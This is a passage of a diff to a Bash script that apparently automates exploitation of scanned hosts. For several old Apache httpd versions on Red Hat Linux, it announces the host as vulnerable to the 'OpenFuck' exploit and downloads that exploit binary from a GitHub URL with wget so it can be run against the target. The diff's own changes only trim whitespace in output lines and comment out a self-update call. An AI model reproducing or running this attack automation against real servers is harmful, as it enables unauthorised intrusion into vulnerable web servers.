 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.12" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.12" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1380,8 +1420,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.20" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.20" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1406,8 +1446,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.22" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1440,8 +1480,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.23" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.23" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1472,8 +1512,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.9" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1498,8 +1538,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.19" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
@@ -1525,8 +1565,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.24" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
@@ -1552,8 +1592,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.0.40" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.0.40" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
@@ -1577,8 +1617,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.26" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
@@ -1612,8 +1652,8 @@ do
 					fi
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.27" ]
 				then
-					echo -e " $BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle "
-					echo -e " $RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
+					echo -e "$BOLD $ips $resetStyle has $BOLD $product $version $resetStyle which is $BOLD vulnerable $resetStyle to $RED OpenF%&k $resetStyle"
+					echo -e "$RED Exploiting $resetStyle $BOLD $product $version $resetStyle is in progress"
 					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
  
@@ -1702,4 +1742,4 @@ do
 	echo "########################################"
 done
 report3
-self_update
+#self_update
